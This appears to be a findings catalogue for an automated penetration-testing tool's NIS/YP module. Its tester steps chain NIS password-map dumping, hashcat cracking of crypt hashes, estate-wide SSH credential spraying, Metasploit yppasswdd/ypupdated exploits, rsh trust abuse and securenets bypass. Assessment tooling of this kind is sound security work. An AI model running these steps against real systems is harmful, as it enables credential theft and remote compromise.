summary: This is the ONLY T3 module in the tranche — nis_passwd_hashes actually captures crackable crypt(3) hashes and hands them to the shared credentials store, from which the estate-wide SSH/SMB spray executes. Full chain from portmap DUMP -> domain guess -> YPPROC_ALL is deterministic. yppasswdd/ypupdated flags are T0 (registration only). Biggest gap is offline crack automation and auto-spraying (already partly wired via _handoff_hashes into creds bucket).

findings.title_pattern: NIS RPC programs registered on rpcbind
findings.tier_evidence: Pure portmap enumeration — RPC programs 100004/100007/100009/100028 named.
findings.promotion_notes: Already effectively lifts the generic RPC-services finding; used as gate for T3 chain below.
findings.tester_next_step: rpcinfo -p <ip>; note ports for 100004 (ypserv) and 100009 (yppasswdd); recce auto-continues to domain guess.

findings.tier_evidence: Registration-only; recce does not actually invoke the RPC.
findings.promotion_notes: T2 = actual CVE-2001-0779 heap-overflow probe (send crafted username, observe crash / signature response). Destructive: crashes yppasswdd. Only under explicit --active-yppasswdd-poc flag.
findings.tester_next_step: rpcinfo -p <ip>; searchsploit yppasswdd; PoC only in a lab: metasploit auxiliary/dos/rpc/yppasswdd (crashes it).

findings.title_pattern: rpc.ypupdated registered (historical unauth RCE, CVE-1999-0208 class)
findings.tier_evidence: Registration only — recce does NOT invoke.
findings.promotion_notes: T3 = fire the CVE-1999-0208 shell-interpolation payload for real RCE. Very destructive (SunOS RCE, ancient); requires explicit --exploit flag and target must be lab-only.
findings.tester_next_step: rpcinfo -p <ip>; MSF exploit/solaris/misc/ypupdated_exec target=<ip> — RCE as root on SunOS 4.x/Solaris 2.x; ONLY IN LAB.

findings.tier_evidence: YPPROC_DOMAIN TRUE + YPPROC_MAPLIST returned list — deterministic on-vuln.
findings.promotion_notes: Already gates the T3 credential dump below. Enrich with cross-service domain-hint feeds (LDAP baseDN / Kerberos realm / SMB workgroup).

findings.title_pattern: NIS passwd map exposes hashed passwords
findings.tier_evidence: Actual crypt(3) hashes extracted, classified, and materialized as Credential objects in the shared creds store — this is captured credential material, downstream spray follows.
findings.promotion_notes: T4 = crack loop (auto-invoke hashcat with format detection by hash_format field), then loop cracked passwords back into SSH/SMB/LDAP/telnet spray via the existing credentials shared surface. Some scaffolding via _handoff_hashes already exists.
findings.tester_next_step: ypcat -d <domain> -h <ip> passwd > loot/nis.pw; hashcat -m 1500 (DES) / -m 500 (md5crypt) / -m 7400 (sha256crypt) / -m 1800 (sha512crypt) loot/nis.pw rockyou.txt; nxc ssh <estate_ips> -u loot/users.txt -p loot/cracked.txt.

findings.title_pattern: NIS passwd map contains 13-char DES crypt hashes (EOL OS)
findings.tier_evidence: Regex-classified DES hash present in dumped output.
findings.promotion_notes: Prioritize DES hashes to head of crack queue (fastest to break — minutes on GPU) so they land as spray-ready creds first.
findings.tester_next_step: hashcat -m 1500 -a 0 loot/nis-des.pw rockyou.txt -O -w 4  # DES cracks in minutes.

findings.title_pattern: NIS group map exposes membership (privileged groups named)
findings.tier_evidence: group.byname walked and privileged group names detected in the actual output.
findings.promotion_notes: Auto-tag every user in wheel/sudo/adm as high-value in the crack queue and prioritize their hashes.
findings.tester_next_step: ypcat -d <domain> -h <ip> group | grep -E '^(wheel|sudo|adm|root):'; then hashcat prioritized on those users' hashes.

findings.title_pattern: NIS netgroup map reveals host-to-host / user-to-host trust
findings.tier_evidence: netgroup map returned and 'root' / '-' entries counted as trust primitives.
findings.promotion_notes: T3 = actual rsh/rlogin passwordless test into netgroup-trusted hosts. Requires an r-services module target. Medium risk since it hits live services.
findings.tester_next_step: For each netgroup granting root/-: rlogin -l root <host_in_netgroup>; rsh <host_in_netgroup> 'id'  # if trust wired via .rhosts/hosts.equiv this returns a shell.

findings.title_pattern: NIS topology maps leak internal hosts / ypservers
findings.promotion_notes: Auto-ingest hosts.byname into known_hosts + queue each ypservers entry as an alternate map source (bypasses securenets from a different source IP).
findings.tester_next_step: ypcat -d <domain> -h <ip> ypservers; then re-run nisyp probe against each slave server — may bypass securenets ACL of the master.

findings.title_pattern: NIS domain leaks but map dumps refused (securenets partially applied)
findings.tier_evidence: YPPROC_DOMAIN=TRUE but YPPROC_ALL empty — deterministic evidence of partial hardening.
findings.promotion_notes: Chain: after foothold on any host with SNMP/SSH creds, auto-retry NIS dump from that source IP.
findings.tester_next_step: After foothold on any in-range client: ssh <client> 'ypcat -d <domain> passwd'  # may succeed where direct scan failed.
